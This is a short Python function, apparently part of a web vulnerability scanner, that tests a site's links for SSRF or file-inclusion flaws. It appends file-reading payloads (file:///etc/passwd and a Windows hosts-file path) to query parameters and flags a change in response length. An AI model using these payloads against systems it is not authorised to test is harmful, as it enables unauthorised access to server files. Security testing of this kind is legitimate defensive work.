import requests
from lxml import etree

def check_ssrf(url):
    # 发送GET请求并检查响应
    winserver_path = "?url=file://c:windows\\system32\\drivers\\etc\\hosts"
    linuxserver_path = "?url=file:///etc/passwd"
    # server_path = ["?url=file://c:windows\\system32\\drivers\\etc\\hosts", "?url=file:///etc/passwd", "?file="]
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",

    }
    response = requests.get(url,headers = headers , verify=False, timeout=5)
    flag = 0
    if ('href' in response.text):
        html = etree.HTML(response.content)
        last_dir = url.rsplit('/', 1)[0]
        link_text_list = html.xpath('//a/@href')
        for link_text in link_text_list:
            if ("?" in link_text):
                link_text = link_text.rsplit('?', 1)[0]
                win_url = last_dir + '/' + link_text + winserver_path
                linux_url = last_dir +'/' +link_text +linuxserver_path
            try:
                if(len(requests.get(win_url).content)!=len(response.content) or len(requests.get(linux_url).content)!=len(response.content)):
                    flag = 1
            except:
                pass
            if flag == 1:
                break
    if flag == 1:
        return True, url,  winserver_path+"or"+linuxserver_path, "ssrf_yes!"
    else:
        return False, url


